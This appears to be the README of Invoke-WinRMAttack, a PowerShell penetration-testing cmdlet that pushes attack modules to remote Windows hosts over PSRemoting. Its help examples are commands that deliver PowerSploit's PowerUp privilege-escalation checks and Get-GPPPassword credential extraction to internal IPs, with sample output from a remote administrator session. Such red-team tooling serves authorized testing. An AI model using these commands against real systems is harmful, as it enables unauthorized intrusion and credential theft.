# Invoke-WinRMAttack
PowerShell cmdlet to push PowerShell attack modules to a remote system via PSRemoting

Help examples below;


Requires -version 2

    <#
            .Synopsis
            Push a PowerShell module to a remote system

            .Description
            This cmdlet will take a path to a single .ps1 script, Push it via the WINRM/PSREmoting communication channel and execute or install in memory

            .Parameter remote
            Target system

            .Parameter modulepath
            Full path to the module .ps1 script ot push to the remote system

            .Parameter creds
            Credentials to access the remote system

            .Parameter autoconnect
            Automatically connect to the remote PSSession

            Written by Dave Hardy, davehardy20@gmail.com @davehardy20
            Help from Ben Turner @benpturner

            Version 0.2

            .Example
            PS> Invoke-WinRMAttack -remote 192.168.134.10 -modulepath C:\Users\daveh\Documents\WindowsPowerShell\Modules\PowerSploit\Privesc\PowerUp.ps1 -creds

            Creating a PSSession to the Remote System
            Pushing the Module to the Remote System
            To connect to the session later, use Invoke-WinRMAttack -autoconnect

            Creates a New PSSession to the Remote system and Pushes the specified module via the remoting session communication channel and executes the script, in this case the PowerUp module.

            .Example
            PS> Invoke-WinRMAttack -remote 192.168.134.10 -modulepath C:\Users\daveh\Documents\WindowsPowerShell\Modules\PowerSploit\Exfiltration\Get-GPPPassword.ps1 -creds

            Remote Session exists
            Pushing the Module to the Remote System
            To connect to the session later, use Invoke-WinRMAttack -autoconnect

            Checks for the remote session and as it exists, just pushes the module to the remote system via the remoting communication channel.

            .Example
            PS> Invoke-WinRMAttack -remote 192.168.0.108 -creds -modulepath C:\Users\daveh\Documents\WindowsPowerShell\Modules\PowerSploit\Privesc\PowerUp.ps1 -autoconnect
            
            Creating a PSSession to the Remote System
            Pushing the Module to the Remote System
            Connecting to Remote Session

            Do everything and connect ot the remote PSSession

    
            .Example
            PS> Invoke-WinRMAttack -remote 192.168.134.10 -creds -autoconnect
            Remote Session exists
            No module specified to push
            Connecting to Remote Session

            Connects to a remote session and allows the operator to run commands

            [192.168.134.10]: PS C:\Users\Administrator\Documents> get-help Invoke-AllChecks

            NAME
            Invoke-AllChecks
    
            SYNOPSIS
            Runs all functions that check for various Windows privilege escalation opportunities.
    
    
            SYNTAX
            Invoke-AllChecks [-HTMLReport] [<CommonParameters>]
    
    
            DESCRIPTION
    

            RELATED LINKS

            REMARKS
            To see the examples, type: "get-help Invoke-AllChecks -examples".
            For more information, type: "get-help Invoke-AllChecks -detailed".
            For technical information, type: "get-help Invoke-AllChecks -full".


    #>